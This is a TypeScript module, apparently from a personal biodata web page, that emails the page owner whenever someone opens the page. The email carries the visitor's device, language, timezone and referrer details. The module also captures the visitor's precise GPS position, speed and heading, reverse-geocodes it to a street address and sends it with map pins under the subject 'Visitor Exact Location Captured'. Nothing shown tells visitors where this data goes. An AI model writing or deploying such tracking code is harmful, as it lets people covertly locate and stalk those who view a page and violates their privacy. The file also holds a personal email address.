import emailjs from "@emailjs/browser";

export const EMAILJS_CONFIG = {
  SERVICE_ID: "service_yhpa91x",
  TEMPLATE_ID: "template_s71j8d7",
  PUBLIC_KEY: "t_7GFFUEQgfM5c5kj",
};

let initialized = false;
const ensureInit = () => {
  if (!initialized) {
    emailjs.init({ publicKey: EMAILJS_CONFIG.PUBLIC_KEY });
    initialized = true;
  }
};

const getVisitorInfo = () => {
  const ua = navigator.userAgent;
  const lang = navigator.language;
  const screen = `${window.screen.width}x${window.screen.height}`;
  const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
  const referrer = document.referrer || "Direct";
  return `User-Agent: ${ua}\nLanguage: ${lang}\nScreen: ${screen}\nTimezone: ${tz}\nReferrer: ${referrer}\nPage: ${window.location.href}`;
};

export const sendVisitEmail = async () => {
  try {
    ensureInit();
    await emailjs.send(EMAILJS_CONFIG.SERVICE_ID, EMAILJS_CONFIG.TEMPLATE_ID, {
      email: "shubhamsc9799@gmail.com",
      subject: "📄 Biodata Page Opened",
      message: "Someone just opened your biodata page.",
      location: "Not requested yet",
      visitor_info: getVisitorInfo(),
      timestamp: new Date().toLocaleString(),
    });
  } catch (e) {
    console.error("Visit email failed:", e);
  }
};

// Reverse geocode using free OpenStreetMap Nominatim API
const reverseGeocode = async (lat: number, lng: number): Promise<string> => {
  try {
    const res = await fetch(
      `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`,
      { headers: { "Accept-Language": "en" } }
    );
    const data = await res.json();
    return data?.display_name || "Address not found";
  } catch {
    return "Address lookup failed";
  }
};

// Get the best (most accurate) reading by sampling watchPosition for a few seconds
const getBestPosition = (): Promise<GeolocationPosition> => {
  return new Promise((resolve, reject) => {
    if (!("geolocation" in navigator)) {
      reject(new Error("Geolocation not supported"));
      return;
    }

    let best: GeolocationPosition | null = null;
    let resolved = false;
    const finish = (pos: GeolocationPosition) => {
      if (resolved) return;
      resolved = true;
      navigator.geolocation.clearWatch(watchId);
      resolve(pos);
    };

    const watchId = navigator.geolocation.watchPosition(
      (pos) => {
        if (!best || pos.coords.accuracy < best.coords.accuracy) {
          best = pos;
        }
        // Send immediately on first fix
        finish(best);
      },
      (err) => {
        if (resolved) return;
        navigator.geolocation.clearWatch(watchId);
        if (best) finish(best);
        else reject(err);
      },
      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
    );

    // Safety stop after 8s — return best so far
    setTimeout(() => {
      if (resolved) return;
      if (best) finish(best);
      else {
        navigator.geolocation.clearWatch(watchId);
        reject(new Error("Timed out without a fix"));
      }
    }, 8000);
  });
};

export const sendLocationEmail = async () => {
  if (!("geolocation" in navigator)) return;
  try {
    const pos = await getBestPosition();
    ensureInit();
    const { latitude, longitude, accuracy, altitude, heading, speed } = pos.coords;
    const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
    const preciseUrl = `https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}`;
    const address = await reverseGeocode(latitude, longitude);

    const locationBlock =
      `📍 Address: ${address}\n` +
      `Latitude: ${latitude}\n` +
      `Longitude: ${longitude}\n` +
      `Accuracy: ~${Math.round(accuracy)} meters\n` +
      (altitude != null ? `Altitude: ${altitude} m\n` : "") +
      (heading != null ? `Heading: ${heading}\n` : "") +
      (speed != null ? `Speed: ${speed} m/s\n` : "") +
      `Google Maps: ${mapsUrl}\n` +
      `Precise pin: ${preciseUrl}`;

    await emailjs.send(EMAILJS_CONFIG.SERVICE_ID, EMAILJS_CONFIG.TEMPLATE_ID, {
      email: "shubhamsc9799@gmail.com",
      subject: "📍 Visitor Exact Location Captured",
      message: `Visitor allowed location access.\n\n${locationBlock}`,
      location: locationBlock,
      visitor_info: getVisitorInfo(),
      timestamp: new Date().toLocaleString(),
    });
  } catch (e) {
    console.warn("Location capture failed:", e);
  }
};
